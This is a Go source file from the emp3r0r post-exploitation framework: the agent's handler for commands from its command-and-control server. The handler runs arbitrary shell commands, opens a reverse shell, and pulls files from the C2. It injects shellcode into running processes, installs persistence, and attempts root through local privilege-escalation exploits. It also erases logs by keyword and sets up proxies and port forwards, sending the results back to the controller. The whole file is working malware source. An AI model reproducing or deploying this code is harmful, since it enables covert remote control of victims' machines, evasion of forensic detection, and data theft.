package agent

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"strconv"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// exec cmd, receive data, etc
func processCCData(data *MsgTunData) {
	var (
		data2send   MsgTunData
		out         string
		outCombined []byte
		err         error
	)
	data2send.Tag = Tag

	payloadSplit := strings.Split(data.Payload, OpSep)
	op := payloadSplit[0]

	switch op {

	// command from CC
	case "cmd":
		cmdSlice := strings.Fields(payloadSplit[1])

		// # shell helpers
		if strings.HasPrefix(cmdSlice[0], "#") {
			out = shellHelper(cmdSlice)
			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
			goto send
		}

		/*
			utils
		*/
		if cmdSlice[0] == "screenshot" {
			if len(cmdSlice) != 1 {
				return
			}

			out, err = util.Screenshot()
			if err != nil {
				out = fmt.Sprintf("Error: failed to take screenshot: %v", err)
				data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
				goto send
			}

			// move to agent root
			err = os.Rename(out, AgentRoot+"/"+out)
			if err == nil {
				out = AgentRoot + "/" + out
			}

			// tell CC where to download the file
			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
			goto send
		}

		/*
			fs commands
		*/

		// ls current path
		if cmdSlice[0] == "ls" {
			if len(cmdSlice) != 1 {
				return
			}
			cwd, err := os.Getwd()
			if err != nil {
				log.Printf("cwd: %v", err)
				goto send
			}
			out, err = util.LsPath(cwd)
			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
			if err != nil {
				data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, err.Error())
			}
			goto send
		}

		// remove file/dir
		if cmdSlice[0] == "rm" {
			out = "rm failed"
			if len(cmdSlice) != 2 {
				return
			}

			if os.RemoveAll(cmdSlice[1]) == nil {
				out = "Deleted " + cmdSlice[1]
			}
			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
			goto send
		}

		// change directory
		if cmdSlice[0] == "cd" {
			out = "cd failed"
			if len(cmdSlice) != 2 {
				return
			}

			if os.Chdir(cmdSlice[1]) == nil {
				out = "changed directory to " + cmdSlice[1]
			}
			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
			goto send
		}

		// bash reverse shell
		if cmdSlice[0] == "bash" {
			if len(cmdSlice) != 2 {
				return
			}
			token := cmdSlice[1]
			err = ActivateShell(token)
			if err != nil {
				out = err.Error()
				data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
				goto send
			}
			return
		}

		// current working directory
		if cmdSlice[0] == "pwd" {
			if len(cmdSlice) != 1 {
				return
			}

			pwd, err := os.Getwd()
			if err != nil {
				log.Println("processCCData: cant get pwd: ", err)
				pwd = err.Error()
			}

			out = "current working directory: " + pwd
			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
			goto send
		}

		// put file on agent
		if cmdSlice[0] == "put" {
			if len(cmdSlice) < 4 {
				return
			}

			url := fmt.Sprintf("%swww/%s", CCAddress, cmdSlice[1])
			path := cmdSlice[2]
			size, err := strconv.ParseInt(cmdSlice[3], 10, 64)
			if err != nil {
				out = fmt.Sprintf("processCCData: cant get size of %s: %v", url, err)
				data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
				goto send
			}
			_, err = DownloadViaCC(url, path)
			if err != nil {
				out = fmt.Sprintf("processCCData: cant download %s: %v", url, err)
				data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
				goto send
			}

			// checksum
			checksum := tun.SHA256SumFile(path)
			downloadedSize := util.FileSize(path)
			out = fmt.Sprintf("%s has been uploaded successfully, sha256sum: %s", path, checksum)
			if downloadedSize < size {
				out = fmt.Sprintf("Uploaded %d of %d bytes, sha256sum: %s\nYou can run `put` again to resume uploading", downloadedSize, size, checksum)
			}

			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
			goto send
		}

		// stat file
		if cmdSlice[0] == "!stat" {
			if len(cmdSlice) < 2 {
				return
			}

			fi, err := os.Stat(cmdSlice[1])
			if err != nil {
				out = fmt.Sprintf("cant stat file %s: %v", cmdSlice[1], err)
			}
			var fstat util.FileStat
			fstat.Permission = fi.Mode().String()
			fstat.Size = fi.Size()
			fstat.Checksum = tun.SHA256SumFile(cmdSlice[1])
			fstat.Name = util.FileBaseName(cmdSlice[1])
			fiData, err := json.Marshal(fstat)
			out = string(fiData)
			if err != nil {
				out = fmt.Sprintf("cant marshal file info %s: %v", cmdSlice[1], err)
			}

			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
			goto send
		}

		/*
		   !command: special commands (not sent by user)
		*/
		// reverse proxy
		if cmdSlice[0] == "!"+ModREVERSEPROXY {
			if len(cmdSlice) != 2 {
				return
			}
			addr := cmdSlice[1]
			out = "Reverse proxy for " + addr + " finished"

			hasInternet := tun.HasInternetAccess()
			isProxyOK := tun.IsProxyOK(AgentProxy)
			if !hasInternet && !isProxyOK {
				out = "We dont have any internet to share"
			}
			for p, cancelfunc := range ReverseConns {
				if addr == p {
					cancelfunc() // cancel existing connection
				}
			}
			addr += ":" + ReverseProxyPort
			ctx, cancel := context.WithCancel(context.Background())
			if err = tun.SSHProxyClient(addr, &ReverseConns, ctx, cancel); err != nil {
				out = err.Error()
			}
			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
			goto send
		}

		// LPE helper
		if strings.HasPrefix(cmdSlice[0], "!lpe_") {
			helper := strings.TrimPrefix(cmdSlice[0], "!")
			out = lpeHelper(helper)
			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
			goto send
		}

		// proxy server
		if cmdSlice[0] == "!proxy" {
			if len(cmdSlice) != 3 {
				log.Printf("args error: %s", cmdSlice)
				return
			}
			log.Printf("Got proxy request: %s", cmdSlice)
			addr := cmdSlice[2]
			err = Socks5Proxy(cmdSlice[1], addr)
			if err != nil {
				log.Printf("Failed to start Socks5Proxy: %v", err)
			}
			return
		}

		// port fwd
		// cmd format: !port_fwd [to/listen] [shID] [operation]
		if cmdSlice[0] == "!port_fwd" {
			if len(cmdSlice) != 4 {
				log.Printf("Invalid command: %v", cmdSlice)
				return
			}
			switch cmdSlice[3] {
			case "stop":
				sessionID := cmdSlice[1]
				pf, exist := PortFwds[sessionID]
				if exist {
					pf.Cancel()
					log.Printf("port mapping %s stopped", pf.Addr)
					break
				}
				log.Printf("port mapping %s not found", pf.Addr)
			case "reverse":
				go func() {
					addr := cmdSlice[1]
					sessionID := cmdSlice[2]
					err = PortFwd(addr, sessionID, true)
					if err != nil {
						log.Printf("PortFwd (reverse) failed: %v", err)
					}
				}()
			case "on":
				go func() {
					to := cmdSlice[1]
					sessionID := cmdSlice[2]
					err = PortFwd(to, sessionID, false)
					if err != nil {
						log.Printf("PortFwd failed: %v", err)
					}
				}()
			default:
			}

			return
		}

		// delete_portfwd
		if cmdSlice[0] == "!delete_portfwd" {
			if len(cmdSlice) != 2 {
				return
			}
			for id, session := range PortFwds {
				if id == cmdSlice[1] {
					session.Cancel()
				}
			}
			return
		}

		// GDB inject
		if cmdSlice[0] == "!inject" {
			if len(cmdSlice) != 3 {
				goto send
			}
			out = fmt.Sprintf("%s: success", cmdSlice[1])
			pid, err := strconv.Atoi(cmdSlice[2])
			if err != nil {
				log.Print("Invalid pid")
			}
			err = InjectShellcode(pid, cmdSlice[1])
			if err != nil {
				out = "failed: " + err.Error()
			}
			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
			goto send
		}

		// download utils.zip
		if cmdSlice[0] == "!utils" {
			out = vaccineHandler()
			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
			goto send
		}

		// persistence
		if cmdSlice[0] == "!persistence" {
			if len(cmdSlice) != 2 {
				return
			}
			out = "Success"
			SelfCopy()
			if cmdSlice[1] == "all" {
				err = PersistAllInOne()
				if err != nil {
					log.Print(err)
					out = fmt.Sprintf("Result: %v", err)
				}
			} else {
				out = "No such method available"
				if method, exists := PersistMethods[cmdSlice[1]]; exists {
					out = "Success"
					err = method()
					if err != nil {
						log.Println(err)
						out = fmt.Sprintf("Result: %v", err)
					}
				}
			}
			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
			goto send
		}

		// get_root
		if cmdSlice[0] == "!get_root" {
			if os.Geteuid() == 0 {
				out = "You already have root!"
			} else {
				err = GetRoot()
				out = fmt.Sprintf("LPE exploit failed:\n%v", err)
				if err == nil {
					out = "Got root!"
				}
			}
			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
			goto send
		}

		// log cleaner
		if cmdSlice[0] == "!clean_log" {
			if len(cmdSlice) != 2 {
				return
			}
			keyword := cmdSlice[1]
			out = "Done"
			err = CleanAllByKeyword(keyword)
			if err != nil {
				out = err.Error()
			}
			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
			goto send
		}

		// exec cmd using os/exec normally, sends stdout and stderr back to CC
		cmd := exec.Command("/bin/sh", "-c", strings.Join(cmdSlice, " "))
		outCombined, err = cmd.CombinedOutput()
		if err != nil {
			log.Println(err)
			outCombined = []byte(fmt.Sprintf("%s\n%v", outCombined, err))
		}

		out = string(outCombined)
		data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)

	// #put file from CC
	case "FILE":
		if len(payloadSplit) != 3 {
			data2send.Payload = "#put failed: malformed #put command"
			goto send
		}

		// where to save the file
		path := payloadSplit[1]
		data := payloadSplit[2]

		// decode
		decData, err := base64.StdEncoding.DecodeString(data)
		if err != nil {
			data2send.Payload = fmt.Sprintf("#put %s failed: %v", path, err)
			goto send
		}

		// write file
		err = ioutil.WriteFile(path, decData, 0600)
		if err != nil {
			data2send.Payload = fmt.Sprintf("#put %s failed: %v", path, err)
			goto send
		}
		size := float32(len(decData)) / 1024
		sha256sum := tun.SHA256SumRaw(decData)
		data2send.Payload = fmt.Sprintf("#put %s successfully done:\n%fKB (%s)", path, size, sha256sum)
		log.Printf("Saved %s from CC\n%s", path, data2send.Payload)
		goto send

	default:
	}

send:
	if err = Send2CC(&data2send); err != nil {
		log.Println(err)
	}
}
